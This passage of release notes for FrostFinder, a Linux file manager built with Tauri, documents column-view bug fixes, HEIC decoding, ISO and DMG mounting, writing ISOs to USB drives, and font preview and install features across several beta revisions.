**`src/views.js` — `_makeColRow`:** `isSel` now uses only `sel.hasp(e.path)` (correct — multi-select aware). New `isTrail = !isSel && ci < state.columns.length - 1 && col.selIdx === ei` drives the `.trail` class. Tag tint background is suppressed when a row is trail-highlighted so the two visuals don't compete.

**`src/views.js` — `_patchEntries` pre-sort fast-path:** Now toggles `.trail` on any row where `+row.dataset.idx === newSelIdx` and the column is not the last one (`!isLast`). Trail highlight survives watcher-triggered refreshes and sort changes without a full column rebuild.

**`src/views.js` — `_patchEntries` post-sort fast-path:** Same fix applied identically.

**Full-rebuild path:** `_patchEntries` evicts and repaints via `_paintColList` → `_makeColRow`, which already carries the `isTrail` logic — no extra work needed here.

**`src/style.css` — `.frow.trail`:** Background `rgba(59,95,160,0.38)` — the `--bg-selected` blue at ~38% opacity, clearly in the same blue family as `.frow.sel` but noticeably dimmer so the active selection dominates. `.frow.trail .fname` uses `#c0d4f5` (pale blue-white) and `.frow.trail .fchev` uses `rgba(91,141,217,.7)` so the disclosure chevron reads as "this column continues". A hover state brightens the trail row slightly without reaching full selection intensity.

---

## What's in Beta-5-r8

**No Rust recompile required.** Changes in `PACK.sh`, `src-tauri/tauri.conf.json`, `src-tauri/Cargo.toml`, `package.json`.

### Fix — Version strings stale in `tauri.conf.json`, `Cargo.toml`, and `package.json`

All three files were stuck at their Beta-5-r1 value (`5.0.1`) while the project had advanced to r7. `package.json` was still at the original `0.1.0`. The compiled binary, `.deb`/`.rpm` package metadata, and npm tooling all reported incorrect version numbers.

**Fix:** Updated all three files to `5.0.8` (semver encoding: `{version}.0.{revision}`).

### Fix — `PACK.sh` never synced versions on repack

`PACK.sh` correctly updated `RELEASE.md` and the `VERSION` file on every run, but left `tauri.conf.json`, `Cargo.toml`, and `package.json` untouched. Versions would fall further out of sync with each subsequent revision.

**Fix:** Added `_sedi` calls in `PACK.sh` after the `RELEASE.md` update block to rewrite the `"version"` field in all three files on every pack run. Semver is derived as `${VERSION}.0.${REVISION}` so it tracks the build scheme automatically. `Cargo.toml` uses a `0,/pattern/s//…/` range address (GNU sed) or a `perl -i` fallback (BSD/macOS) to update only the package-level version line, leaving all dependency version strings untouched.

---

## What's in Beta-5-r7

**Rust recompile NOT required.** Changes in `src/views.js`, `src/ql-window.js`, `ql.html`, `src-tauri/src/main.rs` (dead code only).

### Fix — Column 5+ folder clicks glitch / wrong selection target (`src/views.js`)

`_patchEntries` is the incremental update callback stored on each column DOM element. It was closing over `ci` (the column index at build time) and using it in four places to check `ci === state.columns.length - 1` — the "is this the rightmost column?" test that controls:
- Which column's `sel._e` (the entries array driving selection/keyboard nav) gets updated
- Whether the in-column search filter is applied

`ci` is correct at build time but goes stale as soon as columns are added or removed. On the 5th column (ci=4): navigating forward adds column 5 (length=6), then clicking a folder in column 5 splices to length=5 and pushes the new path. The next watcher-triggered `_patchEntries` call fires with `ci=4`, `state.columns.length=5` — `4 === 4` is `true` and `sel._e` is wrongly assigned to column 5's entries instead of the actual rightmost column. Result: arrow keys, rubber-band drag, and context menus all operated on the wrong column's file list, producing phantom selections and navigate-to-wrong-path bugs.

**Fix:** Compute the live column index from DOM position inside `_patchEntries` using `Array.from(colEl.parentElement.children).indexOf(colEl)` — identical to the strategy already used in the click handler since r49. Replaced all four `ci === state.columns.length - 1` guards with `isLast` derived from the live DOM index.

---

### Feature — Quick Look font preview with Install button (`src/ql-window.js`, `ql.html`)

OTF/TTF/WOFF/WOFF2 files now show the same live font specimen in Quick Look as in the preview panel.

A `@font-face` rule is injected into the QL window's `<head>`, using the font file served via the media port. The specimen shows a 52px display sample, the full A–Z alphabet, digit/symbol row, and two pangrams. An Install button below the specimen calls `install_font` with an animated progress bar, turning green and locking on success.

`FONT_EXTS` added to `ql-window.js` imports. `isFont` detection added alongside `isHtml`/`isXcf`/`isDmg`. `isFont` included in the media port pre-fetch guard. Font CSS added to `ql.html`.

---

### Fix — Dead code warnings (`src-tauri/src/main.rs`)

Removed three unused helper functions that produced `#[warn(dead_code)]` warnings on compile:
- `fn is_xcf_ext` — ext comparison inlined at usage site
- `fn is_html_ext` — ext comparison inlined at usage site
- `fn is_dmg_ext` — ext comparison inlined at usage site

---


## What's in Beta-5-r6

**Rust recompile required.** Changes in `src-tauri/src/main.rs`, `src/utils.js`, `src/views.js`, `src/main.js`, `src/style.css`.

### Fix — App freezes when deleting/trashing large files (`src-tauri/src/main.rs`, `src/main.js`)

`delete_file` was a synchronous `fn` that ran on the Tauri async runtime thread. A cross-device trash of a 5 GB file performed a blocking `fs::copy` loop on that thread, stalling all IPC and freezing the UI until the copy finished.

**Fix:** `delete_file` is now `async fn` with all I/O dispatched via `tauri::async_runtime::spawn_blocking`. The fast path (same-filesystem `fs::rename`) is still instant. The slow cross-device path emits `delete-progress` events `{name, done, total, finished}` per file so the sidebar progress bar shows live feedback.

New `delete_items_stream` command replaces the sequential `delete_file` loop in `deleteEntries` — one IPC round-trip for the whole batch instead of N serial awaits. JS `deleteEntries` (`src/main.js`) now wires a `delete-progress` listener to `_sbProgress` before firing the command and tears it down on completion.

A global `delete-progress` listener in the init boot section covers single-file deletes triggered via context menu or keyboard.

---

### Fix — RTF shows raw markup instead of document text (`src-tauri/src/main.rs`)

RTF files use an escape-heavy control-word syntax. Passing raw bytes to the preview panel produced unreadable markup.

**Fix:** `rtf_to_text()` Rust function strips control words (`\keyword`), hex escapes (`\'xx`), Unicode `\uN`, ignorable `\*` destinations, and brace groups. Paragraph marks (`\par`, `\line`) become newlines. Runs of 3+ blank lines collapse to 2. Applied in `get_file_preview` before returning `content` for `.rtf` files.

---

### Fix — HTML preview serves as download instead of rendering (`src-tauri/src/main.rs`)

`mime_for_path` in the local HTTP media server returned `application/octet-stream` for `.html`/`.htm` files. WebKit treated the response as a file download.

**Fix:** Added `"html"|"htm" => "text/html"` to `mime_for_path`. The sandboxed iframe now receives the correct MIME type and renders the page.

---

### Fix — DMG mount fails: "Object is not a mountable filesystem" (`src-tauri/src/main.rs`)

DMG files contain a partition table (Apple Partition Map or GPT). `udisksctl loop-setup` creates `/dev/loopN` but the filesystem lives on the first partition `/dev/loopNp1`. Passing the loop device directly to `udisksctl mount` failed because it is not itself a filesystem.

**Fix:** Switched to `losetup --find --read-only --partscan --show` which creates partition nodes. After a 400 ms udev settle delay, scans `/sys/block/loopN/` for `loopNpM` entries and mounts the first partition. Falls back to the loop device itself for flat DMGs with no partition table. Cleanup on mount failure uses `losetup -d`.

---

### Feature — Font preview with Install button (`src/utils.js`, `src/views.js`, `src-tauri/src/main.rs`, `src/style.css`)

`.otf` and `.ttf` (and `.woff`/`.woff2`) files now show a live font specimen in the preview panel and a one-click Install button.

**Specimen (`src/views.js`):** A `@font-face` rule served via the media port loads the font into the preview panel. The specimen shows a large display sample (`Aa Bb Cc`), the full alphabet, digit/symbol row, and two pangrams at different sizes.

**Install button:** Clicking Install calls `install_font` (Rust). An indeterminate progress bar animates during the `fc-cache` rebuild. On success the button turns green and is disabled. On failure the error is shown inline with a red bar.

**Rust (`src-tauri/src/main.rs`):**
- `install_font(path)` — async, copies to `~/.local/share/fonts/`, runs `fc-cache -f`. Returns installed path.
- `is_font_installed(filename)` — sync check; used to disable the Install button if already present.

**`src/utils.js`:** Added `FONT_EXTS = ['otf','ttf','woff','woff2']`, orange colour accent (`#fb923c`), `mimeLabel` entries for all four font MIME types.

---


## What's in Beta-5-r5

**Rust recompile required.** Changes in `src-tauri/src/main.rs`, `src/utils.js`, `src/views.js`, `src/ql-window.js`, `src/style.css`.

### Fix — Auto-refresh: only the last-navigated column was watched (`src-tauri/src/main.rs`, `src/main.js`)

`watch_dir` previously accepted a single `path: String` and watched only the most recently navigated directory. In column view with three columns open (e.g. Home → Projects → src), only the rightmost column fired `dir-changed`. Files transferred, downloaded, or pasted into any other open column were never detected until the user navigated away and back.

**Fix (`src-tauri/src/main.rs`):** `watch_dir` now accepts `paths: Vec<String>` and registers a `RecursiveMode::NonRecursive` watcher on every path in the list. The debounce thread now uses `HashSet<String>` to coalesce bursts per directory — rapid events across multiple directories within the 300 ms window each produce exactly one `dir-changed` emission with the specific changed path as payload.

**Fix (`src/main.js`):** The `watch_dir` call site now passes all currently-open column paths plus the just-navigated path: `invoke('watch_dir', { paths: [...new Set([...state.columns.map(c => c.path), path])] })`. All standard triggers that refresh the directory listing are covered — transfer complete, paste complete, download complete (`.crdownload → filename` rename), drag-drop, terminal create/delete.

---

### Feature — RTF file support (`src/utils.js`, `src-tauri/src/main.rs`)

`.rtf` files are now recognised as documents throughout the app.

- Added `'rtf'` to `DOC_EXTS` in `utils.js` — RTF files get the document icon and doc-grey colour.
- Added `'rtf'` to `text_exts` in `get_file_preview` (Rust) — the file is read as plain text and shown in the preview code block and QL text pane. RTF source is human-readable markup, so the raw text preview is genuinely useful.
- Added `mime_type` entry: `"rtf" => "application/rtf"`.
- Added `'application/rtf': 'RTF Document'` to `mimeLabel` in `utils.js`.

---

### Feature — XCF (GIMP) file support (`src/utils.js`, `src/views.js`, `src/ql-window.js`, `src/style.css`)

`.xcf` files are now recognised as images for icon/colour purposes, with a graceful "can't render inline" fallback in all preview surfaces.

- Added `'xcf'` to `IMAGE_EXTS` — gets the image icon and GIMP-green (`#34d399`) colour accent.
- Added `mime_type`: `"xcf" => "image/x-xcf"` and `mimeLabel` entry `'image/x-xcf': 'GIMP Image'`.
- **Preview panel (`src/views.js`):** New `ext2 === 'xcf'` branch renders a centred icon + "XCF files cannot be rendered inline. Open in GIMP to view or edit." nudge instead of attempting an `<img>` decode that would silently fail.
- **Gallery (`src/views.js`):** `IMAGE_EXTS.includes(ext) && ext !== 'xcf'` guard prevents XCF from entering the image-slot path. XCF falls through to a `gallery-dir-preview` card showing the icon and "GIMP Image · Cannot preview inline".
- **Quick Look (`src/ql-window.js`):** `isXcf` branch renders the same open-in-app message in the QL window body.
- **CSS (`src/style.css`):** Added `.preview-xcf`, `.xcf-label`, `.xcf-hint` rules.

---

### Feature — DMG (Apple Disk Image) mount/unmount (`src-tauri/src/main.rs`, `src/utils.js`, `src/views.js`, `src/ql-window.js`)

`.dmg` files are now treated as mountable drives, mirroring the existing ISO workflow.

**Rust (`src-tauri/src/main.rs`):** Three new `#[tauri::command]` functions:
- `mount_dmg(path)` — `udisksctl loop-setup --read-only` + `udisksctl mount`; returns mountpoint. Falls back to `losetup -j` if udisksctl output parsing fails.
- `unmount_dmg(loop_dev)` — `udisksctl unmount` + `udisksctl loop-delete`; falls back to `losetup -d`.
- `get_dmg_loop_device(dmg_path)` — scans `losetup --list --json` to find the active loop device for a given DMG path.

All three are Linux-only (`#[cfg(target_os = "linux")]`) with clear error messages on other platforms. All three registered in `invoke_handler`.

**`src/utils.js`:** Added `DMG_EXTS = ['dmg']`; disc icon; pink (`#f472b6`) colour; `mime_type` `application/x-apple-diskimage`; `mimeLabel` `'Apple Disk Image'`.

**Preview panel (`src/views.js`):** New `DMG_EXTS.includes(ext2)` branch renders Mount/Unmount buttons (reusing `.iso-btn` / `.iso-actions` styles). `_wireDmgPreview()` controller wires async mount-state check + Mount/Unmount click handlers. On mount success, navigates into the mountpoint automatically.

**Gallery (`src/views.js`):** DMG files render a disc-icon info card (size + "Apple Disk Image" label). No inline mount controls in gallery — user opens the file to use the preview panel.

**Quick Look (`src/ql-window.js`):** `isDmg` branch renders a compact Mount/Unmount panel directly inside the QL window body, wired inline.

---

### Feature — HTML file web-page preview (`src/utils.js`, `src/views.js`, `src/ql-window.js`, `src/style.css`)

`.html` and `.htm` files previously displayed as raw source text. They now render as a live web page via a sandboxed `<iframe>` served through the existing media port, in all three preview surfaces.

- **`src/utils.js`:** Added `HTML_EXTS = ['html', 'htm']`. Removed `'html'` from `DOC_EXTS` (source-text treatment). Added `mimeLabel` entry `'text/html': 'HTML Document'`. HTML files get the document icon.
- **Preview panel (`src/views.js`):** New `HTML_EXTS.includes(ext2)` branch inserts `<iframe class="preview-html" sandbox="allow-scripts allow-same-origin">` inside `.preview-html-wrap` — same flex/border-radius pattern as `.preview-pdf-wrap`.
- **Gallery (`src/views.js`):** New `HTML_EXTS.includes(ext)` branch returns a `gallery-html-slot` iframe. Slot is included in the zoom-target selector.
- **Quick Look (`src/ql-window.js`):** `isHtml` branch appends a full-body `<iframe class="ql-html-frame">`. Media port gate includes `isHtml` so the port is fetched before rendering.
- **CSS (`src/style.css`):** Added `.preview-html-wrap`, `.preview-html`, `.gallery-html`, `.ql-html-frame` rules — mirrors the existing PDF iframe rules.

---


## What's in Beta-5-r1

**Rust recompile required.** Changes in `src-tauri/src/main.rs`, `src-tauri/Cargo.toml`, `src-tauri/tauri.conf.json`, `src/main.js`, `src/style.css`, `index.html`.

### Feature — Sidebar operation progress bar (`src/main.js`, `src/style.css`, `index.html`)

All file operations now show a progress bar with live percentage at the bottom of the sidebar instead of floating toast bars.

#### Operations covered

| Operation | Trigger |
|---|---|
| Copy (Ctrl+C → Ctrl+V) | Paste via keyboard or menu |
| Move (Ctrl+X → Ctrl+V) | Paste via keyboard or menu |
| Drag-and-drop copy/move | Drop onto folder |
| Empty Trash | Trash banner button or context menu |

#### Design

A fixed slot `#sb-ops-progress` is appended inside `index.html` immediately after the sidebar `<aside>`. It slides up from below the sidebar when an operation starts (`transform: translateY(0)`) and slides back down when complete. The bar colour transitions to green on success or red on error, then auto-hides after 1.4 s (success) or 2.8 s (error).

The `_sbProgress` controller (`main.js`) exposes three methods used by all operations:
- `start(label, total)` — show bar, set initial label
- `update(done, total, label)` — advance bar and percentage counter in real time
- `finish(success, msg)` — snap to 100%, flash green/red, auto-hide

#### `empty_trash_stream` Rust command

The old synchronous `empty_trash` is supplemented by a new `empty_trash_stream` command that:
1. Counts total trash items first so progress can be computed
2. Emits `trash-progress` events `{done, total, finished}` per item deleted
3. Runs in `spawn_blocking` so the UI stays responsive during large trash operations

The JS `_emptyTrashWithProgress()` helper subscribes to `trash-progress` before invoking the command (preventing the missed-event race) and drives the sidebar bar.

### Status bump: Beta 4 → Beta 5

All core features are stable and complete:
- Column view, list view, icon view, gallery view
- Quick Look floating native window
- ISO mount / write-to-USB
- HEIC preview (via heif-convert)
- Multi-tab navigation, undo/redo
- File tags, search, drag-and-drop
- Sidebar operation progress bar (this release)

---

---

## What's in Beta-4-r50

**Rust recompile required.** Changes in `src-tauri/src/main.rs`, `src-tauri/Cargo.toml`, `src/views.js`.

### Fix — ISO preview panel not showing (`src/views.js`)

The ISO branch in `renderPreview`'s if-chain was missing its closing `}else if(d2?.is_text...)` continuation. The ISO content string was built correctly, then immediately overwritten by `content=\`<pre class="preview-code">...\`` on the very next line. Result: selecting a `.iso` file showed the text preview fallback (which crashed trying to render `d2.content` on a binary file) instead of the ISO panel with Mount/Write to USB controls.

**Fix:** Restored the correct `}else if(d2?.is_text&&d2?.content!=null){` continuation after the ISO branch.

---

### Fix — ISO mount_iso: loop device not found (`src-tauri/src/main.rs`)

udisksctl writes "Mapped file ... as /dev/loopN." to **stderr** on some versions, not stdout. The original parser only scanned stdout, so the loop device path was never found and mount always failed.

**Fix:**
1. Combined stdout + stderr before scanning for the `/dev/loop` token
2. Cleaner token extraction: `trim_end_matches(['.', ',', ';'])` instead of fragile `.or(Some(w))` chain
3. Added `losetup -j <path>` fallback — if udisksctl output parsing still fails, `losetup -j` queries all active loop devices by backing file and returns the correct device

---

### Fix — Column 4+ click glitch: DOM-position-based column index (`src/views.js`)

The r49 fix used `state.columns.findIndex(c => c.path === col.path)` to find the live column index. This fails in two cases:
- **Same directory open twice**: if the user navigates into the same folder at two different depths, both columns share the same path. `findIndex` returns the first match, which is the wrong column.
- **State rebuild race**: after a rapid navigation, state.columns may be rebuilt with a new object at the same index. The old `col` (closure-captured) is no longer in state.columns, but another column *with the same path* still is — `findIndex` matches it incorrectly.

**Fix:** Use `Array.from(colEl.parentElement.children).indexOf(colEl)` — the colEl's actual DOM position among its siblings. This is always unambiguous: each DOM element has exactly one position, regardless of paths or state rebuilds. Added bounds check (`liveCI >= state.columns.length`) to catch the case where state.columns was truncated below the column's position.

---

---

## What's in Beta-4-r49

**No Rust recompile required.** Change in `src/views.js` only.

### Fix — Column view glitch when clicking folders in subdirectories (`src/views.js`)

Two related bugs in the column list click handler caused glitches specifically when clicking directories in deep columns (3rd level and beyond).

#### Bug 1 — Stale closure-captured `ci` used for `state.columns.splice()`

**Root cause:** The click handler used `ci`, which is captured from the `forEach` index at column BUILD time. This is normally correct because columns are only appended/trimmed from the end and never reordered. However, during rapid navigation (user clicks before the previous `navigate()` resolves), the async `navigate()` from a previous click could rebuild state.columns with a different layout. If a click event fired from a column whose `ci` no longer matched its actual position in `state.columns`, `state.columns.splice(ci + 1)` would truncate at the wrong index — potentially removing the wrong trailing columns or leaving stale ones.

**Fix:** At the start of the click handler, the column's *live* position is found by path: `state.columns.findIndex(c => c.path === col.path)`. If the column's path is no longer in `state.columns` at all (the column was removed by a concurrent navigation), the handler bails immediately. All subsequent `splice` and `navigate` calls use `liveCI` instead of `ci`.

#### Bug 2 — Detached `colList` could still receive queued click events

**Root cause:** When the reconciliation loop removes a column from the DOM (e.g. because the user navigated to a sibling folder), the column's `colList` element is detached. However, a click event that was already queued in the browser's event loop (user clicked just before reconciliation ran) could still fire on the detached element. The existing guard `row.closest('.col-list') !== colList` only checked that the row belongs to *this* colList — it did not check whether colList was still in the document.

A click on a detached `colList` would run `state.columns.splice(ci + 1)` (now using the stale `ci`) and call `navigate()`, corrupting the column state and causing the visible glitch: wrong columns appearing, columns jumping, or the view resetting unexpectedly.

**Fix:** Added `if (!colList.isConnected) return` as the first check in the click, dblclick, and contextmenu handlers. A detached list cannot have valid column state and any event on it is discarded immediately.

---

---

## What's in Beta-4-r48

**Rust recompile required.** Fixes two build errors from r47.

### Fix — JS syntax error: orphaned media-slot code outside any function (`src/views.js`)

The `str_replace` that inserted the ISO preview wiring accidentally left a duplicate copy of the video/audio media-slot block (lines 2681–2718) outside any function, between `_showIsoBurnDialog`'s closing brace and the Tags UI section. esbuild's parser rejected the file with `Unexpected "}"`.

**Fix:** Removed the orphaned duplicate. The authoritative copy inside `renderPreview` (which was always correct) is unchanged.

### Fix — `ExitStatus::from_raw` trait not in scope (`src-tauri/src/main.rs`)

`write_iso_to_usb` used `std::process::ExitStatus::from_raw(1)` as a fallback when `child.wait()` fails. `from_raw` requires the `std::os::unix::process::ExitStatusExt` trait to be in scope, which was not imported.

**Fix:** Replaced the `unwrap_or_else(|_| from_raw(1))` pattern with a direct `let success = child.wait().map(|s| s.success()).unwrap_or(false)` check, eliminating the trait dependency entirely.

---

---

## What's in Beta-4-r47

**Rust recompile required.** Changes in `src-tauri/src/main.rs`, `src-tauri/Cargo.toml`, `src/views.js`, `src/main.js`, `src/style.css`.

### Fix — HEIC grayscale: use heif-convert as primary decoder (`src-tauri/src/main.rs`)

**Root cause:** ffmpeg's MJPEG encoder requires `yuvj420p`, but HEIC files often contain Display P3, bt2020 (HDR), or 10-bit (`yuv420p10le`) colorspaces. Even with the `format=yuv420p` filter added in r44, ffmpeg's libheif wrapper doesn't always correctly perform the colorspace conversion before the encoder — the internal negotiation path varies by ffmpeg build and libheif version, producing silent grayscale output on many Arch/CachyOS systems.

**Fix:** `heif-convert` (from the `libheif-examples` package) is now tried first for both thumbnail generation and full-resolution `/heic-jpeg/` display. `heif-convert` uses libheif's native colorspace handling — it always outputs correct RGB regardless of the input colorspace. Workflow:

1. Run `heif-convert -q 90 input.heic /tmp/ff_heic_NNN.png`
2. Load the PNG with the `image` crate, resize, encode as JPEG → cache
3. If `heif-convert` is not installed or fails: fall back to ffmpeg with `format=yuv420p -pix_fmt yuvj420p`

Install the required package:
```bash
sudo pacman -S libheif   # includes heif-convert
```

> **Note:** Delete `~/.cache/frostfinder/thumbs/` after upgrading to force thumbnail regeneration with the new decoder.

---

### Fix — "Burn" renamed to "Write to USB Drive" (`src-tauri/src/main.rs`, `src/views.js`, `src/main.js`)

**Previous behaviour:** The "Burn to Disc…" button/action was wired to `wodim` targeting optical drives.

**New behaviour:** The feature is now "Write to USB Drive" and writes the ISO to a removable USB drive using `dd`. No extra tools needed — `dd` is standard on all Linux systems.

#### `list_usb_drives()` replaces `list_optical_drives()`
Lists removable whole-disk devices via `lsblk -J -b -o NAME,SIZE,TYPE,RM,HOTPLUG,...`. Returns `Vec<(device, label, size_bytes)>`. Filters: `type=disk`, `rm=true or hotplug=true`, not mounted at `/` or `/boot`. Sizes shown in drive selector dropdown.

#### `write_iso_to_usb(iso_path, device)` replaces `burn_iso()`
- Multiple safety checks: only `/dev/sd*`, `/dev/hd*`, `/dev/vd*`, `/dev/mmcblk*`; whole disk only (no partition numbers); refuses to touch the system root disk
- Unmounts all partitions on the target device before writing (best-effort `umount -l`)
- Runs `dd if=<iso> of=<device> bs=4M status=progress oflag=sync`
- Progress via SIGUSR1 ticker thread → parses dd's byte-count lines → emits `iso-burn-progress` events with `{percent, line, bytes_written, done, error?}`
- Final `sync` to flush kernel write buffers to hardware before reporting complete
- All work in `spawn_blocking` — UI fully responsive during write

Emits `iso-burn-progress` events identical to before so the progress bar UI in the preview panel is unchanged.

---

---

## What's in Beta-4-r46

**Rust recompile required.** Changes in `src-tauri/src/main.rs`, `src-tauri/Cargo.toml`, `src/utils.js`, `src/views.js`, `src/main.js`, `src/style.css`.

### Feature — ISO disc image: mount and burn (`src-tauri/src/main.rs`, `src/views.js`, `src/main.js`, `src/utils.js`, `src/style.css`)

#### Four new Rust commands

**`mount_iso(path)`** — Mounts a `.iso` file as a read-only loop device using `udisksctl loop-setup` + `udisksctl mount`. Returns the mountpoint (e.g. `/run/media/user/LABEL`). No sudo required — Polkit handles privilege via udisks2. After mounting, FrostFinder automatically navigates into the ISO contents.

**`unmount_iso(loop_dev)`** — Unmounts and detaches the loop device. First tries `udisksctl loop-delete`, falls back to `losetup -d`.

**`get_iso_loop_device(iso_path)`** — Checks whether an ISO is currently mounted by scanning `losetup --list --json` for a matching back-file. Returns the loop device path (`/dev/loopN`) or empty string.

**`list_optical_drives()`** — Lists writable optical drives by scanning `lsblk -J -o NAME,TYPE,VENDOR,MODEL` for entries with `type=rom`. Returns `Vec<(device, label)>` e.g. `[("/dev/sr0", "ASUS DRW-24D5MT")]`.

**`burn_iso(iso_path, device)`** — Burns an ISO to an optical drive using `wodim`. Runs in a `spawn_blocking` thread so the UI stays responsive during the entire burn (which can take 10+ minutes). Parses wodim's `Track 01: XX MB written` output lines to compute percentage progress. Emits `iso-burn-progress` events: `{percent, line, done, error?}`. Automatically ejects the disc when done.

#### ISO preview panel (`src/views.js`)

Selecting a `.iso` file in the preview panel shows a dedicated ISO view with:
- Disc icon with glow effect
- File size
- Mount status (checked async via `get_iso_loop_device` on load)
- **Mount ISO** button → calls `mount_iso`, navigates to mountpoint on success
- **Unmount** button (shown when mounted) → calls `unmount_iso`
- **Burn to Disc…** button → opens optical drive picker dialog

The status indicator updates live: green "Mounted as /dev/loopN" or grey "Not mounted".

#### Burn dialog (`src/views.js`)

A modal dialog with drive selector (populated from `list_optical_drives`), safety warning, and inline progress bar. Progress lines from wodim stream in real-time via the `iso-burn-progress` Tauri event.

#### Context menu actions (`src/main.js`)

Right-clicking a `.iso` file adds two items:
- **Mount ISO** — mounts immediately, navigates to mountpoint
- **Burn to Disc…** — opens the burn dialog via the preview panel

#### Utils additions (`src/utils.js`)
- `ISO_EXTS = ['iso']` constant
- `disc` SVG icon (concentric circles)
- `mount` / `unmount` / `burn` SVG icons
- ISO color `#f472b6` (pink)
- ISO file icon → `disc`
- `mimeLabel` entry for `application/x-iso9660-image`

#### Dependencies
- `udisks2` — required for mount/unmount (install: `sudo pacman -S udisks2`)
- `wodim` — required for burning (install: `sudo pacman -S cdrtools`)
- `util-linux` — provides `losetup` (standard on all Linux)

---

---

## What's in Beta-4-r45

**No Rust recompile required.** Change in `src/style.css` only.

### Fix — Column view layout thrash and glitches on deep navigation (`src/style.css`)

Three CSS bugs were causing column-view glitches that worsened with each level of depth navigated.

#### Bug 1 — `.col:last-child { flex:1 }` caused width snapping on every navigation

**Root cause:** The last column in the strip had `flex:1`, making it expand to fill remaining horizontal space. Every time a column was added or removed:

1. The previous last-child lost `flex:1` and snapped from a variable wide width back to 220px
2. The new last-child gained `flex:1` and expanded
3. That synchronous width change triggered the `ResizeObserver` on the affected column's `col-list`
4. `_paintColList` ran unnecessarily on a column whose content hadn't changed
5. The visible width flash showed as a column "jumping" on every navigation step

This matched the document's diagnosis: *"If glitches start around column 3, there's a high chance your UI is doing layout reflow when columns overflow the container."*

**Fix:** Removed `flex:1` from `.col:last-child`. All columns are now fixed-width at all times. `min-width:max-content` on `.cols-container` already handles strip expansion. Only `border-right:none` is kept on the last child.

```css
/* Before */
.col:last-child { border-right:none; flex:1; }

/* After */
.col:last-child { border-right:none; }
```

#### Bug 2 — Missing `contain` on `.col` allowed cross-column layout propagation

**Root cause:** Without CSS containment, a reflow inside any column (row elements added/removed by the virtual scroller, spacer height change) could propagate across all sibling columns. This is the CSS equivalent of the document's warning about layout feedback loops — each column should be fully isolated from its neighbours.

**Fix:** Added `contain:layout style paint` to `.col`. Each column is now a layout containment boundary. Reflows inside one column cannot affect any other column.

```css
/* Before */
.col { width:220px; flex-shrink:0; ... }

/* After */
.col { width:220px; min-width:220px; flex-shrink:0; contain:layout style paint; ... }
```

`min-width:220px` added alongside `width` so the column cannot be squeezed below its intended width by a flex parent even when `contain` changes its box model participation.

#### Bug 3 — Dead `will-change:transform` + `transition` on `.cols-container`

**Root cause:** `.cols-container` had `will-change:transform` and `transition:transform 0.18s`. The transform value was never actually changed in any JS code path, so the animation never fired — but `will-change:transform` told the GPU to allocate a dedicated compositing layer for the *entire column strip*, including all columns and their contents. This was unnecessary VRAM usage and forced the browser to composite the full strip as a single texture.

**Fix:** Removed both `will-change:transform` and `transition:transform`. The GPU compositor now handles each column independently via the `contain` and `will-change:scroll-position` rules already present.

---

---

## What's in Beta-4-r44

**Rust recompile required.** Changes in `src-tauri/src/main.rs`, `src-tauri/Cargo.toml`, `src/views.js`.

### Fix — HEIC/HEIF images display in grayscale (`src-tauri/src/main.rs`)

**Root cause:** Both the `make_thumbnail` function and the `/heic-jpeg/` full-resolution endpoint used `ffmpeg -vcodec mjpeg` without specifying a pixel format. The MJPEG encoder requires `yuvj420p` (JPEG-range 8-bit YUV). HEIC files frequently use non-compatible internal pixel formats:

- 10-bit HEIC → `yuv420p10le` — MJPEG cannot encode this directly
- HDR/wide-gamut HEIC → `bt2020` colorspace — chroma conversion fails silently

When ffmpeg receives a pixel format the MJPEG encoder cannot handle, it silently drops the chroma plane and emits a grayscale JPEG. No error is logged.

**Fix — two sites in `main.rs`:**

**1. `make_thumbnail` (thumbnail generation):** Added `format=yuv420p` to the `-vf` filter chain and `-pix_fmt yuvj420p` flag. `format=yuv420p` forces an 8-bit SDR colorspace conversion before the encoder; `-pix_fmt yuvj420p` explicitly selects the JPEG-range variant the MJPEG encoder expects.

```
Before: -vf "scale=256:256:force_original_aspect_ratio=decrease" -f image2 -vcodec mjpeg
After:  -vf "scale=256:256:force_original_aspect_ratio=decrease,format=yuv420p" -pix_fmt yuvj420p -f image2 -vcodec mjpeg
```

**2. `/heic-jpeg/` full-resolution endpoint:** Same fix — added `-vf format=yuv420p -pix_fmt yuvj420p` before the output flags. This corrects full-resolution HEIC display in the preview panel, gallery main view, lightbox, and Quick Look window.

```
Before: -f image2 -vcodec mjpeg pipe:1
After:  -vf format=yuv420p -pix_fmt yuvj420p -f image2 -vcodec mjpeg pipe:1
```

**Important:** Any HEIC thumbnails already in the cache will still be grayscale until the cache entry expires (or the source file is modified). Delete `~/.cache/frostfinder/thumbs/` to force regeneration.

---

### Fix — Preview panel image flickers on every watcher event (`src/views.js`)

**Root cause:** `renderPreview()` had a `sameVideo` short-circuit guard (skips full panel rebuild when the same video is already playing), but no equivalent guard for images. Every `render()` call — including those triggered by filesystem watcher events every ~300ms during active downloads — tore down and recreated the `<img>` element unconditionally. The browser fetched the image URL again on each rebuild, producing a visible reload flash every few hundred milliseconds whenever a download was in progress or any file in the watched directory was being written.

**Fix:** Added a `sameImage` guard mirroring `sameVideo`. When the same image path is already displayed (`panel.dataset.previewPath === e.path`), the extension hasn't changed, and `#preview-img` is still connected to the DOM, `renderPreview` returns immediately after refreshing only the tags section — no `<img>` teardown, no network reload, no flash.

```js
const sameImage = e && IMAGE_EXTS.includes(newExt)
  && panel.dataset.previewPath === e.path
  && panel.dataset.previewExt  === newExt
  && _previewImg?.isConnected;
if (sameImage) {
  // refresh tags only — image element untouched
  return;
}
```

---

## What's in Beta-4-r43



**Rust recompile required** (off-by-one fix in `main.rs`). Also changes `src/main.js`.

### Fix — Watcher-triggered freeze on large folders (`src/main.js`)

**Root cause:** `refreshColumns()` was calling `listDirectory(col.path)`, which maps to the `list_directory` Rust command. That command stats every file with full metadata (size, mtime, permissions) using rayon, then serialises the entire `Vec<FileEntry>` as one JSON blob across the IPC bridge. On a Downloads folder with 1500 files this produces a ~300 KB payload that WebKit blocks the main thread deserialising — and it happened on every watcher event (debounced to 300 ms).

**Fix:** `refreshColumns()` now calls `invoke('list_directory_fast', {path})` instead. This returns `FileEntryFast` (name + type only, zero `stat()` calls — `file_type()` is free on Linux from the `dirent` `d_type` field). The payload shrinks from ~300 KB to ~40 KB and involves no syscalls beyond `read_dir`. Column view only needs names and directory flags for the fingerprint check and row display; full metadata is fetched lazily on selection as before.

---

### Fix — Column stuck at 60 entries after fast navigation (`src/main.js`)

